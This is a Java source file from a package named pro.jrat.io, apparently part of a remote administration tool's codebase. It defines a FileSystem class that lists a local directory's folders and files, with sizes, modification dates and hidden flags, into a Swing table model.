package pro.jrat.io;

import java.io.File;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import javax.swing.Icon;
import javax.swing.table.DefaultTableModel;

import pro.jrat.utils.IconUtils;


public class FileSystem {

	public static void addDir(String dir, DefaultTableModel model, HashMap<String, Icon> icons) {
		File f = new File(dir);
		if (f.exists()) {
			File[] childs = f.listFiles();
			List<Object[]> files = new ArrayList<Object[]>();
			List<Object[]> dirs = new ArrayList<Object[]>();
			if (childs != null) {
				for (int i = 0; i < childs.length; i++) {
					if (childs[i].isDirectory()) {
						icons.put(childs[i].getAbsolutePath(), IconUtils.getFileIcon(childs[i]));
						dirs.add(new Object[] { childs[i].getAbsolutePath(), "", "", childs[i].isHidden() ? "Yes" : "" });
					} else if (childs[i].isFile()) {
						long sizei = childs[i].length() / 1024L;
						String size = sizei + " kB";
						Calendar cal = Calendar.getInstance();
						cal.setTime(new Date(childs[i].lastModified()));
						String date = (cal.get(Calendar.MONTH) + 1) + "/" + cal.get(Calendar.DAY_OF_MONTH) + "/" + cal.get(Calendar.YEAR) + " " + (00 + cal.get(Calendar.HOUR_OF_DAY)) + ":" + cal.get(Calendar.MINUTE);
						
						icons.put(childs[i].getAbsolutePath(), IconUtils.getFileIcon(childs[i]));
						files.add(new Object[] { childs[i].getAbsolutePath(), size, date, childs[i].isHidden() ? "Yes" : ""});
					}
				}
			}
			
			for (Object[] obj : dirs) {
				for (Object o : obj) {
					System.out.println(o.toString());
				}
				model.addRow(obj);
			}
			for (Object[] obj : files) {
				for (Object o : obj) {
					System.out.println(o.toString());
				}
				model.addRow(obj);
			}
		}
	}

}
